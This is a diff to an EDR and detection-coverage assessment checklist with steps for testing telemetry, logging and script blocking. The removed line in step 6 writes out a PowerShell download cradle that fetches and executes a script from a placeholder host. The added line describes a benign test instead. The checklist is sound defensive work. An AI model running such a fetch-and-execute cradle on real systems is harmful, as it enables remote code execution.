@@ -18,7 +18,7 @@ Use during Phase 1 to assess EDR coverage, telemetry quality, and ATT&CK detecti
 3. Test telemetry flow — run EICAR test on each OS type and verify alert in SIEM within 5 minutes
 4. Validate process creation logging — confirm `sysmon` event ID 1 or EDR equivalent flowing
 5. Confirm network telemetry — verify DNS request and network connection events
-6. Test script execution blocking — run `IEX (New-Object Net.WebClient).DownloadString('http://test')` in test environment
+6. Test script execution blocking — in a test environment, confirm the EDR blocks or alerts on a harmless PowerShell download cradle that fetches a benign script from an internal test server
 
 ## ATT&CK Detection Coverage Matrix
 
